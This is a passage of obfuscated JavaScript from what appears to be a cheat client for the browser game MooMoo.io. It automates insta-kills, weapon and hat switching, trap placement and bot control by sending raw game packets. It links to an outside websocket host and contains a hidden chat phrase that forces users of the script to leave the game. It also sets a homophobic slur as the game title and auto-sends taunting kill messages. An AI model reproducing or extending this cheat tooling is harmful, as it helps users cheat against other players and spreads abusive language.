      if (instaC.canCounter) {
        instaC.canCounter = false;
        if (player.reloads[player.weapons[0]] == 0 && !instaC.isTrue) {
          instaC.counterType();
        }
      }
      if (instaC.canSpikeTick) {
        instaC.canSpikeTick = false;
        if (instaC.revTick) {
          instaC.revTick = false;
          if ([1, 2, 3, 4, 5, 6].includes(player.weapons[0]) && player.reloads[player.weapons[1]] == 0 && !instaC.isTrue) {
            instaC.changeType("rev");
            chch(null, "[RevSyncHit]", "yellow");
          }
        } else if ([1, 2, 3, 4, 5, 6].includes(player.weapons[0]) && player.reloads[player.weapons[0]] == 0 && !instaC.isTrue) {
          instaC.spikeTickType();
          if (instaC.syncHit) {
            chch(null, "[SyncHit]", "yellow");
          }
        }
      }
      if (!clicks.middle && (clicks.left || clicks.right) && !instaC.isTrue) {
        if (player.weaponIndex != (clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]) || player.buildIndex > -1) {
          selectWeapon(clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]);
        }
        if (player.reloads[clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0 && !my.waitHit) {
          sendAutoGather();
          my.waitHit = 1;
          game.tickBase(() => {
            sendAutoGather();
            my.waitHit = 0;
          }, 1);
        }
      }
      if (useWasd && !clicks.left && !clicks.right && !instaC.isTrue && near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8 && !traps.inTrap) {
        if (player.weaponIndex != player.weapons[0] || player.buildIndex > -1) {
          selectWeapon(player.weapons[0]);
        }
        if (player.reloads[player.weapons[0]] == 0 && !my.waitHit) {
          sendAutoGather();
          my.waitHit = 1;
          game.tickBase(() => {
            sendAutoGather();
            my.waitHit = 0;
          }, 1);
        }
      }
      if (traps.inTrap) {
        if (!clicks.left && !clicks.right && !instaC.isTrue) {
          if (player.weaponIndex != (traps.notFast() ? player.weapons[1] : player.weapons[0]) || player.buildIndex > -1) {
            selectWeapon(traps.notFast() ? player.weapons[1] : player.weapons[0]);
          }
          if (player.reloads[traps.notFast() ? player.weapons[1] : player.weapons[0]] == 0 && !my.waitHit) {
            sendAutoGather();
            my.waitHit = 1;
            game.tickBase(() => {
              sendAutoGather();
              my.waitHit = 0;
            }, 1);
          }
        }
      }
      if (clicks.middle && !traps.inTrap) {
        if (!instaC.isTrue && player.reloads[player.weapons[1]] == 0) {
          if (my.ageInsta && player.weapons[0] != 4 && player.weapons[1] == 9 && player.age >= 9 && enemy.length) {
            instaC.bowMovement();
          } else {
            instaC.rangeType();
          }
        }
      }
      if (macro.t && !traps.inTrap) {
        if (!instaC.isTrue && player.reloads[player.weapons[0]] == 0 && (player.weapons[1] == 15 ? player.reloads[player.weapons[1]] == 0 : true) && (player.weapons[0] == 5 || player.weapons[0] == 4 && player.weapons[1] == 15)) {
          instaC[player.weapons[0] == 4 && player.weapons[1] == 15 ? "kmTickMovement" : "tickMovement"]();
        } else if (!instaC.isTrue && player.reloads[player.weapons[0]] == 0 && ([9, 12, 13, 15].includes(player.weapons[1]) ? player.reloads[player.weapons[1]] == 0 : true)) {
          instaC.boostTickMovement();
        }
      }
      if (player.weapons[1] && !clicks.left && !clicks.right && !traps.inTrap && !instaC.isTrue && (!useWasd || near.dist2 > items.weapons[player.weapons[0]].range + near.scale * 1.8)) {
        if (player.reloads[player.weapons[0]] == 0 && player.reloads[player.weapons[1]] == 0) {
          if (!my.reloaded) {
            my.reloaded = true;
            let _0x1c788f = items.weapons[player.weapons[0]].spdMult < items.weapons[player.weapons[1]].spdMult ? 1 : 0;
            if (player.weaponIndex != player.weapons[_0x1c788f] || player.buildIndex > -1) {
              selectWeapon(player.weapons[_0x1c788f]);
            }
          }
        } else {
          my.reloaded = false;
          if (useWasd) {
            autos.stopspin = false;
          }
          if (player.reloads[player.weapons[0]] > 0) {
            if (player.weaponIndex != player.weapons[0] || player.buildIndex > -1) {
              selectWeapon(player.weapons[0]);
            }
          } else if (player.reloads[player.weapons[0]] == 0 && player.reloads[player.weapons[1]] > 0) {
            if (player.weaponIndex != player.weapons[1] || player.buildIndex > -1) {
              selectWeapon(player.weapons[1]);
            }
            if (useWasd) {
              if (!autos.stopspin) {
                setTimeout(() => {
                  autos.stopspin = true;
                }, 750);
              }
            }
          }
        }
      }
      if (!instaC.isTrue && !traps.inTrap && !traps.replaced) {
        traps.autoPlace();
      }
      if (!macro.q && !macro.f && !macro.v && !macro.h && !macro.n) {
        packet("D", getAttackDir());
      }
      let _0x2423e1 = function () {
        if (my.anti0Tick > 0) {
          buyEquip(6, 0);
        } else if (clicks.left || clicks.right) {
          if (clicks.left) {
            if (getEl("weaponGrind").checked == true) {
              buyEquip(player.reloads[clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0 ? 40 : player.barbarian ? 26 : player.empAnti ? 22 : 22, 0);
              buyEquip(21, 1);
            }
            buyEquip(18, 1);
            buyEquip(player.reloads[player.weapons[0]] == 0 ? getEl("weaponGrind").checked ? 40 : 7 : player.soldierAnti ? 6 : getEl("antiBullType").value == "abreload" && near.antiBull > 0 ? 11 : near.dist2 <= 300 ? getEl("antiBullType").value == "abalway" && near.reloads[near.primaryIndex] == 0 ? 11 : 6 : biomeGear(1, 1), 0);
          } else if (clicks.right) {
            buyEquip(player.reloads[clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0 ? 40 : player.empAnti ? 22 : 22, 0);
            buyEquip(21, 1);
          }
        } else if (traps.inTrap) {
          if (traps.info.health <= items.weapons[player.weaponIndex].dmg ? false : player.reloads[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0) {
            if (near.dist3 <= 300 && traps.info.health <= 300 && items.weapons[near.weapons[0]] == 0) {
              buyEquip(6, 0);
            } else {
              buyEquip(40, 0);
            }
          } else {
            buyEquip(6, 0);
          }
        } else if (player.empAnti) {
          buyEquip(player.empAnti ? 22 : 6, 0);
        } else if (player.barbarian) {
          buyEquip(player.barbarian ? 26 : 6, 0);
        } else if (player.shameCount > 4 && (game.tick - player.bullTick) % config.serverUpdateRate === 0 && player.skinIndex != 45 || my.reSync) {
          buyEquip(7, 0);
        } else {
          buyEquip(6, 0);
        }
      };
      let _0x487577 = function () {
        if (near.dist2 <= 300) {
          buyEquip(19, 1);
        } else if (clicks.left) {
          buyEquip(0, 1);
        } else {
          buyEquip(11, 1);
        }
      };
      let _0x365cea = function () {
        if (my.anti0Tick > 0) {
          buyEquip(6, 0);
        } else if (clicks.left || clicks.right) {
          if (clicks.left) {
            buyEquip(player.reloads[player.weapons[0]] == 0 ? getEl("weaponGrind").checked ? 40 : 7 : player.empAnti ? 22 : 6, 0);
          } else if (clicks.right) {
            buyEquip(player.reloads[clicks.right && player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0 ? 40 : player.empAnti ? 22 : 6, 0);
          }
        } else if (near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8 && !traps.inTrap) {
          buyEquip(player.reloads[player.weapons[0]] == 0 ? 7 : player.empAnti ? 22 : 6, 0);
        } else if (traps.inTrap) {
          if (traps.info.health <= items.weapons[player.weaponIndex].dmg ? false : player.reloads[player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]] == 0) {
            buyEquip(40, 0);
          } else if (player.shameCount > 4320 && (game.tick - player.bullTick) % config.serverUpdateRate === 0 && player.skinIndex != 45 || my.reSync) {
            buyEquip(7, 0);
          } else {
            buyEquip(player.empAnti ? 22 : 6, 0);
          }
        } else if (player.empAnti) {
          buyEquip(22, 0);
        } else if (player.shameCount > 4320 && (game.tick - player.bullTick) % config.serverUpdateRate === 0 && player.skinIndex != 45 || my.reSync) {
          buyEquip(7, 0);
        } else {
          buyEquip(6, 0);
        }
        if (clicks.left || clicks.right) {
          if (clicks.left) {
            buyEquip(0, 1);
          }
        } else if (near.dist2 <= items.weapons[player.weapons[0]].range + near.scale * 1.8 && !traps.inTrap) {
          buyEquip(0, 1);
        } else if (traps.inTrap) {
          buyEquip(0, 1);
        } else {
          buyEquip(11, 1);
        }
      };
      if (storeMenu.style.display != "block" && !instaC.isTrue && !instaC.ticking) {
        if (useWasd) {
          _0x365cea();
        } else {
          _0x2423e1();
          _0x487577();
        }
      }
      if (configs.autoPush && enemy.length && !traps.inTrap && !instaC.ticking) {
        autoPush();
      } else if (my.autoPush) {
        my.autoPush = false;
        packet("a", lastMoveDir || undefined, 1);
      }
      instaC.ticking &&= false;
      instaC.syncHit &&= false;
      player.empAnti &&= false;
      player.soldierAnti &&= false;
      if (my.anti0Tick > 0) {
        my.anti0Tick--;
      }
      traps.replaced &&= false;
      traps.antiTrapped &&= false;
      const _0x489f5b = (_0x10db1b, _0x576533) => {
        const _0x265148 = _0x576533.weapons[1] === 10 && !player.reloads[_0x576533.weapons[1]] ? 1 : 0;
        const _0x1773c4 = _0x576533.weapons[_0x265148];
        if (player.reloads[_0x1773c4]) {
          return 0;
        }
        const _0x3e3e20 = items.weapons[_0x1773c4];
        const _0x2ffe5f = cdf(_0x10db1b, _0x576533) <= _0x10db1b.getScale() + _0x3e3e20.range;
        if (_0x576533.visible && _0x2ffe5f) {
          return _0x3e3e20.dmg * (_0x3e3e20.sDmg || 1) * 3.3;
        } else {
          return 0;
        }
      };
      const _0x1c0679 = () => {
        const _0x171827 = [];
        const _0x12b2f6 = player.x;
        const _0x2de22a = player.y;
        const _0x3aaa33 = gameObjects.length;
        for (let _0x59b219 = 0; _0x59b219 < _0x3aaa33; _0x59b219++) {
          const _0x271799 = gameObjects[_0x59b219];
          if (_0x271799.isItem && _0x271799.active && _0x271799.health > 0) {
            const _0xa461c0 = items.list[_0x271799.id];
            const _0x3437ef = 35 + _0xa461c0.scale + (_0xa461c0.placeOffset || 0);
            const _0x2ce96c = cdf(_0x271799, player) <= _0x3437ef * 2;
            if (_0x2ce96c) {
              let _0x2cac0b = 0;
              const _0x4144aa = players.length;
              for (let _0x1cfe6f = 0; _0x1cfe6f < _0x4144aa; _0x1cfe6f++) {
                _0x2cac0b += _0x489f5b(_0x271799, players[_0x1cfe6f]);
              }
              if (_0x271799.health <= _0x2cac0b) {
                _0x171827.push(_0x271799);
              }
            }
          }
        }
        const _0x1350fc = (_0x246a35, _0x337cfc, _0x3c3b1d) => {
          if (!_0x3c3b1d) {
            return null;
          }
          const _0x3fc51b = Math.PI * 2;
          const _0x13fc15 = Math.PI / 360;
          const _0x586581 = items.list[_0x246a35.items[_0x337cfc]];
          let _0x1beecb = Math.atan2(_0x3c3b1d.y - _0x246a35.y, _0x3c3b1d.x - _0x246a35.x);
          let _0x33f159 = _0x246a35.scale + (_0x586581.scale || 1) + (_0x586581.placeOffset || 0);
          for (let _0x4d5832 = 0; _0x4d5832 < _0x3fc51b; _0x4d5832 += _0x13fc15) {
            let _0x14bfe5 = [(_0x1beecb + _0x4d5832) % _0x3fc51b, (_0x1beecb - _0x4d5832 + _0x3fc51b) % _0x3fc51b];
            for (let _0x5e179f of _0x14bfe5) {
              return _0x5e179f;
            }
          }
          return null;
        };
        const _0x5b653a = () => {
          let _0x53f3eb = liztobj.filter(_0x2bb4a9 => _0x2bb4a9.trap && _0x2bb4a9.active && _0x2bb4a9.isTeamObject(player) && cdf(_0x2bb4a9, player) <= _0x2bb4a9.getScale() + 5);
          let _0x4dacc4 = gameObjects.find(_0x484409 => _0x484409.dmg && _0x484409.active && _0x484409.isTeamObject(player) && cdf(_0x484409, player) < 87 && !_0x53f3eb.length);
          const _0x2c5c56 = _0x4dacc4 ? 4 : 2;
          _0x171827.forEach(_0x25e5bd => {
            let _0x3f3587 = _0x1350fc(player, _0x2c5c56, _0x25e5bd);
            if (_0x3f3587 !== null) {
              place(_0x2c5c56, _0x3f3587);
              textManager.showText(_0x25e5bd.x, _0x25e5bd.y, 20, 0.15, 1850, "⭐", "#fff", 2);
            }
          });
        };
        if (near && near.dist3 <= 360) {
          _0x5b653a();
        }
        _0x5b653a;
      };
    }
  }
  if (botSkts.length) {
    botSkts.forEach(_0x6401e3 => {
      if (true) {
        _0x6401e3[0].showName = "YEAHHH";
      }
    });
  }
}
for (var i1 = 0; i1 < liztobj.length; i1++) {
  if (liztobj[i1].active && liztobj[i1].health > 0 && UTILS.getDist(liztobj[i1], player, 0, 2) < 150 && getEl("antipush").checked) {
    if (liztobj[i1].name.includes("spike") && liztobj[i1]) {
      if (liztobj[i1].owner.sid != player.sid && clicks.left == false && tmpObj.reloads[tmpObj.secondaryIndex] == 0) {
        selectWeapon(player.weapons[1]);
        buyEquip(40, 0);
        packet("D", UTILS.getDirect(liztobj[i1], player, 0, 2));
        setTickout(() => {
          buyEquip(6, 0);
        }, 1);
      }
    }
  }
}
function ez(_0x1cb556, _0xf79edd, _0xe5d332) {
  _0x1cb556.fillStyle = "rgba(0, 255, 255, 0.2)";
  _0x1cb556.beginPath();
  _0x1cb556.arc(_0xf79edd, _0xe5d332, 55, 0, Math.PI * 2);
  _0x1cb556.fill();
  _0x1cb556.closePath();
  _0x1cb556.globalAlpha = 1;
}
function updateLeaderboard(_0x2c8667) {
  lastLeaderboardData = _0x2c8667;
  return;
  UTILS.removeAllChildren(leaderboardData);
  let _0x3d18db = 1;
  for (let _0x31c9e8 = 0; _0x31c9e8 < _0x2c8667.length; _0x31c9e8 += 3) {
    (function (_0x57ab89) {
      UTILS.generateElement({
        class: "leaderHolder",
        parent: leaderboardData,
        children: [UTILS.generateElement({
          class: "leaderboardItem",
          style: "color:" + (_0x2c8667[_0x57ab89] == playerSID ? "#fff" : "rgba(255,255,255,0.6)"),
          text: _0x3d18db + ". " + (_0x2c8667[_0x57ab89 + 1] != "" ? _0x2c8667[_0x57ab89 + 1] : "unknown")
        }), UTILS.generateElement({
          class: "leaderScore",
          text: UTILS.sFormat(_0x2c8667[_0x57ab89 + 2]) || "0"
        })]
      });
    })(_0x31c9e8);
    _0x3d18db++;
  }
}
function loadGameObject(_0x4a3547) {
  for (let _0x1a018e = 0; _0x1a018e < _0x4a3547.length;) {
    objectManager.add(_0x4a3547[_0x1a018e], _0x4a3547[_0x1a018e + 1], _0x4a3547[_0x1a018e + 2], _0x4a3547[_0x1a018e + 3], _0x4a3547[_0x1a018e + 4], _0x4a3547[_0x1a018e + 5], items.list[_0x4a3547[_0x1a018e + 6]], true, _0x4a3547[_0x1a018e + 7] >= 0 ? {
      sid: _0x4a3547[_0x1a018e + 7]
    } : null);
    _0x1a018e += 8;
  }
}
function loadAI(_0x17cf93) {
  for (let _0x15998b = 0; _0x15998b < ais.length; ++_0x15998b) {
    ais[_0x15998b].forcePos = !ais[_0x15998b].visible;
    ais[_0x15998b].visible = false;
  }
  if (_0x17cf93) {
    let _0x5b00f0 = performance.now();
    for (let _0x4ee485 = 0; _0x4ee485 < _0x17cf93.length;) {
      tmpObj = findAIBySID(_0x17cf93[_0x4ee485]);
      if (tmpObj) {
        tmpObj.index = _0x17cf93[_0x4ee485 + 1];
        tmpObj.t1 = tmpObj.t2 === undefined ? _0x5b00f0 : tmpObj.t2;
        tmpObj.t2 = _0x5b00f0;
        tmpObj.x1 = tmpObj.x;
        tmpObj.y1 = tmpObj.y;
        tmpObj.x2 = _0x17cf93[_0x4ee485 + 2];
        tmpObj.y2 = _0x17cf93[_0x4ee485 + 3];
        tmpObj.d1 = tmpObj.d2 === undefined ? _0x17cf93[_0x4ee485 + 4] : tmpObj.d2;
        tmpObj.d2 = _0x17cf93[_0x4ee485 + 4];
        tmpObj.health = _0x17cf93[_0x4ee485 + 5];
        tmpObj.dt = 0;
        tmpObj.visible = true;
      } else {
        tmpObj = aiManager.spawn(_0x17cf93[_0x4ee485 + 2], _0x17cf93[_0x4ee485 + 3], _0x17cf93[_0x4ee485 + 4], _0x17cf93[_0x4ee485 + 1]);
        tmpObj.x2 = tmpObj.x;
        tmpObj.y2 = tmpObj.y;
        tmpObj.d2 = tmpObj.dir;
        tmpObj.health = _0x17cf93[_0x4ee485 + 5];
        if (!aiManager.aiTypes[_0x17cf93[_0x4ee485 + 1]].name) {
          tmpObj.name = config.cowNames[_0x17cf93[_0x4ee485 + 6]];
        }
        tmpObj.forcePos = true;
        tmpObj.sid = _0x17cf93[_0x4ee485];
        tmpObj.visible = true;
      }
      _0x4ee485 += 7;
    }
  }
}
function animateAI(_0x51146e) {
  tmpObj = findAIBySID(_0x51146e);
  if (tmpObj) {
    tmpObj.startAnim();
  }
}
function gatherAnimation(_0x1fd2ed, _0x4da0da, _0x274a54) {
  tmpObj = findPlayerBySID(_0x1fd2ed);
  if (tmpObj) {
    tmpObj.startAnim(_0x4da0da, _0x274a54);
    tmpObj.gatherIndex = _0x274a54;
    tmpObj.gathering = 1;
    if (_0x4da0da) {
      let _0x4f8f4e = objectManager.hitObj;
      objectManager.hitObj = [];
      game.tickBase(() => {
        tmpObj = findPlayerBySID(_0x1fd2ed);
        let _0x376bb8 = items.weapons[_0x274a54].dmg * config.weaponVariants[tmpObj[(_0x274a54 < 9 ? "prima" : "seconda") + "ryVariant"]].val * (items.weapons[_0x274a54].sDmg || 1) * (tmpObj.skinIndex == 40 ? 3.3 : 1);
        _0x4f8f4e.forEach(_0xd772e2 => {
          _0xd772e2.health -= _0x376bb8;
        });
      }, 1);
    }
  }
}
function wiggleGameObject(_0x4abc9e, _0x704498) {
  tmpObj = findObjectBySid(_0x704498);
  if (tmpObj) {
    tmpObj.xWiggle += config.gatherWiggle * Math.cos(_0x4abc9e);
    tmpObj.yWiggle += config.gatherWiggle * Math.sin(_0x4abc9e);
    if (tmpObj.health) {
      objectManager.hitObj.push(tmpObj);
    }
  }
}
function shootTurret(_0x10998e, _0x346a05) {
  tmpObj = findObjectBySid(_0x10998e);
  if (tmpObj) {
    if (config.anotherVisual) {
      tmpObj.lastDir = _0x346a05;
    } else {
      tmpObj.dir = _0x346a05;
    }
    tmpObj.xWiggle += config.gatherWiggle * Math.cos(_0x346a05 + Math.PI);
    tmpObj.yWiggle += config.gatherWiggle * Math.sin(_0x346a05 + Math.PI);
  }
}
function updatePlayerValue(_0x4f3b69, _0x59be81, _0x183b14) {
  if (player) {
    player[_0x4f3b69] = _0x59be81;
    if (_0x4f3b69 == "points") {
      if (configs.autoBuy) {
        autoBuy.hat();
        autoBuy.acc();
      }
    } else if (_0x4f3b69 == "kills") {
      if (configs.killChat) {
        if (getEl("autogg").value == "1") {
          sendChat("Wow! Cry Better!: " + _0x59be81 + " DeD");
        } else if (getEl("autogg").value == "2") {
          sendChat("Why die " + tmpObj.name + " XDD");
        } else if (getEl("autogg").value == "3") {
          let _0x1bd01d = getKillChatMessage(_0x59be81);
          sendChat(_0x1bd01d);
        }
      }
    }
  }
}
function getKillChatMessage(_0x5f041b) {
  let _0x53281b = Math.floor(_0x5f041b / 10) * 10;
  if (_0x5f041b <= 1) {
    return "First Blood!";
  } else if (_0x5f041b <= 2) {
    return "Double Kill!";
  } else if (_0x5f041b <= 3) {
    return "Triple Kill!";
  } else if (_0x5f041b <= 4) {
    return "Legendary!";
  } else if (_0x5f041b <= 5) {
    return "God Like!";
  } else if (_0x5f041b <= 6) {
    return "Maniac!";
  } else if (_0x5f041b <= 7) {
    return "Savage!";
  } else if (_0x5f041b <= 8) {
    return "Rampage!";
  } else if (_0x5f041b <= 9) {
    return "Invisible!";
  } else if (_0x5f041b <= 10) {
    return "Immortal!";
  } else if (_0x5f041b > 10) {
    return "just killed: " + _0x5f041b + "ppl today";
  }
}
function updateItems(_0x66385, _0x82a2c8) {
  if (_0x66385) {
    if (_0x82a2c8) {
      player.weapons = _0x66385;
      player.primaryIndex = player.weapons[0];
      player.secondaryIndex = player.weapons[1];
      if (!instaC.isTrue) {
        selectWeapon(player.weapons[0]);
      }
    } else {
      player.items = _0x66385;
    }
  }
  for (let _0xf379df = 0; _0xf379df < items.list.length; _0xf379df++) {
    let _0x3eb758 = items.weapons.length + _0xf379df;
    getEl("actionBarItem" + _0x3eb758).style.display = player.items.indexOf(items.list[_0xf379df].id) >= 0 ? "inline-block" : "none";
  }
  for (let _0x52a93a = 0; _0x52a93a < items.weapons.length; _0x52a93a++) {
    getEl("actionBarItem" + _0x52a93a).style.display = player.weapons[items.weapons[_0x52a93a].type] == items.weapons[_0x52a93a].id ? "inline-block" : "none";
  }
  let _0x254d5b = player.weapons[0] == 3 && player.weapons[1] == 15;
  if (_0x254d5b) {
    getEl("actionBarItem3").style.display = "none";
    getEl("actionBarItem4").style.display = "inline-block";
  }
}
function addProjectile(_0x327545, _0x46af4a, _0x28b605, _0x11f136, _0x375a80, _0x3e1cc8, _0x4f8a0b, _0x2e5ef2) {
  projectileManager.addProjectile(_0x327545, _0x46af4a, _0x28b605, _0x11f136, _0x375a80, _0x3e1cc8, null, null, _0x4f8a0b, inWindow).sid = _0x2e5ef2;
  runAtNextTick.push(Array.prototype.slice.call(arguments));
}
function remProjectile(_0x3e3dd6, _0x5058e9) {
  for (let _0x57f3e4 = 0; _0x57f3e4 < projectiles.length; ++_0x57f3e4) {
    if (projectiles[_0x57f3e4].sid == _0x3e3dd6) {
      projectiles[_0x57f3e4].range = _0x5058e9;
      let _0x1faaeb = objectManager.hitObj;
      objectManager.hitObj = [];
      game.tickBase(() => {
        let _0x1218fd = projectiles[_0x57f3e4].dmg;
        _0x1faaeb.forEach(_0x3d006d => {
          if (_0x3d006d.projDmg) {
            _0x3d006d.health -= _0x1218fd;
          }
        });
      }, 1);
    }
  }
}
let noob = false;
let serverReady = true;
var isProd = location.hostname !== "127.0.0.1" && !location.hostname.startsWith("192.168.");
let wssws = isProd ? "wss" : "ws";
let project = new WebSocket(wssws + "://beautiful-sapphire-toad.glitch.me");
let withSync = false;
project.binaryType = "arraybuffer";
project.onmessage = function (_0xb37d48) {
  let _0x35a0e8 = _0xb37d48.data;
  if (_0x35a0e8 == "isready") {
    serverReady = true;
  }
  if (_0x35a0e8 == "fine") {
    noob = false;
  }
  if (_0x35a0e8 == "tezt") {
    addMenuChText(player.name + "[" + player.sid + "]", "EEEEEEEEEEE", "white");
  }
  if (_0x35a0e8 == "yeswearesyncer") {
    withSync = true;
    if (player) {
      textManager.showText(player.x, player.y, 35, 0.1, 500, "Sync: " + window.pingTime + "ms", "#fff");
      console.log("synced!!!!!!!! also delay: " + window.pingTime + "ms");
    }
  }
};
project.onopen = function () {
  var _0x44dbdb = getEl("gameName");
  _0x44dbdb.innerText = "Cry Faggot Boy";
};
function allianceNotification(_0x43acdc, _0x58d65a) {
  let _0x44706f = findSID(bots, _0x43acdc);
  if (_0x44706f) {}
}
function setPlayerTeam(_0x219ee8, _0x2a85f6) {
  if (player) {
    player.team = _0x219ee8;
    player.isOwner = _0x2a85f6;
    if (_0x219ee8 == null) {
      alliancePlayers = [];
    }
  }
}
function setAlliancePlayers(_0x4d260b) {
  alliancePlayers = _0x4d260b;
}
function updateStoreItems(_0xd71677, _0x449f50, _0x148917) {
  if (_0x148917) {
    if (!_0xd71677) {
      player.tails[_0x449f50] = 1;
    } else {
      player.latestTail = _0x449f50;
    }
  } else if (!_0xd71677) {
    player.skins[_0x449f50] = 1;
    if (_0x449f50 == 7) {
      my.reSync = true;
    }
  } else {
    player.latestSkin = _0x449f50;
  }
}
function receiveChat(_0x5d111a, _0x533381) {
  let _0x1bcdbe = false;
  let _0x506de3 = findPlayerBySID(_0x5d111a);
  addMenuChText(_0x506de3.name + "[" + _0x506de3.sid + "]", _0x533381, "white");
  _0x506de3.chatMessage = _0x533381;
  _0x506de3.chatCountdown = config.chatCountdown;
  if (configs.autochat) {
    if (_0x533381.includes("")) {
      packet("6", "");
    } else if (_0x533381.includes("")) {
      packet("6", "");
    } else if (_0x533381.includes("")) {
      packet("6", "");
    } else if (_0x533381.includes("")) {
      packet("6", "");
    } else if (_0x533381.includes("")) {
      packet("6", "");
    } else if (_0x533381.includes("")) {
      packet("6", "");
    }
  }
  if (_0x533381.includes("hwbdnwndoqd123")) {
    setTimeout(() => {
      packet("6", "1");
    }, 1000);
    setTimeout(() => {
      window.leave();
    }, 5000);
  }
}
function updateMinimap(_0x313dbe) {
  minimapData = _0x313dbe;
}
function showText(_0x43c6d8, _0x5bde02, _0x496353, _0x4de8f4) {
  textManager.stack.push({
    x: _0x43c6d8,
    y: _0x5bde02,
    value: _0x496353
  });
}
let bots = [];
let ranLocation = {
  x: UTILS.randInt(35, 14365),
  y: UTILS.randInt(35, 14365)
};
setInterval(() => {
  ranLocation = {
    x: UTILS.randInt(35, 14365),
    y: UTILS.randInt(35, 14365)
  };
}, 60000);
class Bot {
  constructor(_0x3e5b41, _0x41f930, _0x3d6a8a, _0x14913b) {
    this.millPlace = true;
    this.id = _0x3e5b41;
    this.sid = _0x41f930;
    this.team = null;
    this.skinIndex = 0;
    this.tailIndex = 0;
    this.hitTime = 0;
    this.iconIndex = 0;
    this.enemy = [];
    this.near = [];
    this.dist2 = 0;
    this.aim2 = 0;
    this.tick = 0;
    this.itemCounts = {};
    this.latestSkin = 0;
    this.latestTail = 0;
    this.points = 0;
    this.tails = {};
    for (let _0x5b9fb2 = 0; _0x5b9fb2 < _0x14913b.length; ++_0x5b9fb2) {
      if (_0x14913b[_0x5b9fb2].price <= 0) {
        this.tails[_0x14913b[_0x5b9fb2].id] = 1;
      }
    }
    this.skins = {};
    for (let _0x5d31c2 = 0; _0x5d31c2 < _0x3d6a8a.length; ++_0x5d31c2) {
      if (_0x3d6a8a[_0x5d31c2].price <= 0) {
        this.skins[_0x3d6a8a[_0x5d31c2].id] = 1;
      }
    }
    this.spawn = function (_0x36f4ae) {
      this.upgraded = 0;
      this.enemy = [];
      this.near = [];
      this.active = true;
      this.alive = true;
      this.lockMove = false;
      this.lockDir = false;
      this.minimapCounter = 0;
      this.chatCountdown = 0;
      this.shameCount = 0;
      this.shameTimer = 0;
      this.sentTo = {};
      this.gathering = 0;
      this.autoGather = 0;
      this.animTime = 0;
      this.animSpeed = 0;
      this.mouseState = 0;
      this.buildIndex = -1;
      this.weaponIndex = 0;
      this.dmgOverTime = {};
      this.noMovTimer = 0;
      this.maxXP = 300;
      this.XP = 0;
      this.age = 1;
      this.kills = 0;
      this.upgrAge = 2;
      this.upgradePoints = 0;
      this.x = 0;
      this.y = 0;
      this.zIndex = 0;
      this.xVel = 0;
      this.yVel = 0;
      this.slowMult = 1;
      this.dir = 0;
      this.nDir = 0;
      this.dirPlus = 0;
      this.targetDir = 0;
      this.targetAngle = 0;
      this.maxHealth = 100;
      this.health = this.maxHealth;
      this.oldHealth = this.maxHealth;
      this.scale = config.playerScale;
      this.speed = config.playerSpeed;
      this.resetMoveDir();
      this.resetResources(_0x36f4ae);
      this.items = [0, 3, 6, 10];
      this.weapons = [0];
      this.shootCount = 0;
      this.weaponXP = [];
      this.isBot = false;
      this.reloads = {
        0: 0,
        1: 0,
        2: 0,
        3: 0,
        4: 0,
        5: 0,
        6: 0,
        7: 0,
        8: 0,
        9: 0,
        10: 0,
        11: 0,
        12: 0,
        13: 0,
        14: 0,
        15: 0,
        53: 0
      };
      this.timeZinceZpawn = 0;
      this.whyDie = "";
      this.clearRadius = false;
      this.circlee = 0;
    };
    this.resetMoveDir = function () {
      this.moveDir = undefined;
    };
    this.resetResources = function (_0x27f0ca) {
      for (let _0xbc5e27 = 0; _0xbc5e27 < config.resourceTypes.length; ++_0xbc5e27) {
        this[config.resourceTypes[_0xbc5e27]] = _0x27f0ca ? 100 : 0;
      }
    };
    this.setData = function (_0x59558e) {
      this.id = _0x59558e[0];
      this.sid = _0x59558e[1];
      this.name = _0x59558e[2];
      this.x = _0x59558e[3];
      this.y = _0x59558e[4];
      this.dir = _0x59558e[5];
      this.health = _0x59558e[6];
      this.maxHealth = _0x59558e[7];
      this.scale = _0x59558e[8];
      this.skinColor = _0x59558e[9];
    };
    this.judgeShame = function () {
      if (this.oldHealth < this.health) {
        if (this.hitTime) {
          let _0x4d1bcd = this.tick - this.hitTime;
          this.hitTime = 0;
          if (_0x4d1bcd < 2) {
            this.lastshamecount = this.shameCount;
            this.shameCount++;
          } else {
            this.lastshamecount = this.shameCount;
            this.shameCount = Math.max(0, this.shameCount - 2);
          }
        }
      } else if (this.oldHealth > this.health) {
        this.hitTime = this.tick;
      }
    };
    this.manageReloadaa = function () {
      if (this.shooting[53]) {
        this.shooting[53] = 0;
        this.reloads[53] = 2388.8888888888887;
      } else if (this.reloads[53] > 0) {
        this.reloads[53] = Math.max(0, this.reloads[53] - 1000 / 9);
      }
      if (this.gathering || this.shooting[1]) {
        if (this.gathering) {
          this.gathering = 0;
          this.reloads[this.gatherIndex] = items.weapons[this.gatherIndex].speed * (this.skinIndex == 20 ? 0.78 : 1);
          this.attacked = true;
        }
        if (this.shooting[1]) {
          this.shooting[1] = 0;
          this.reloads[this.shootIndex] = items.weapons[this.shootIndex].speed * (this.skinIndex == 20 ? 0.78 : 1);
          this.attacked = true;
        }
      } else {
        this.attacked = false;
        if (this.buildIndex < 0) {
          if (this.reloads[this.weaponIndex] > 0) {
            this.reloads[this.weaponIndex] = Math.max(0, this.reloads[this.weaponIndex] - game.tickRate);
          }
        }
      }
    };
    this.closeSockets = function (_0x38ad40) {
      _0x38ad40.close();
    };
    this.whyDieChat = function (_0x511d1f, _0x457781) {
      _0x511d1f.sendWS("6", "why die XDDD " + _0x457781);
    };
  }
}
;
class BotObject {
  constructor(_0x2ed98d) {
    this.sid = _0x2ed98d;
    this.init = function (_0x506f33, _0x697833, _0x5465f6, _0x2be70e, _0x4ab8b5, _0x49c355, _0x4440ac) {
      _0x49c355 = _0x49c355 || {};
      this.active = true;
      this.x = _0x506f33;
      this.y = _0x697833;
      this.scale = _0x2be70e;
      this.owner = _0x4440ac;
      this.id = _0x49c355.id;
      this.dmg = _0x49c355.dmg;
      this.trap = _0x49c355.trap;
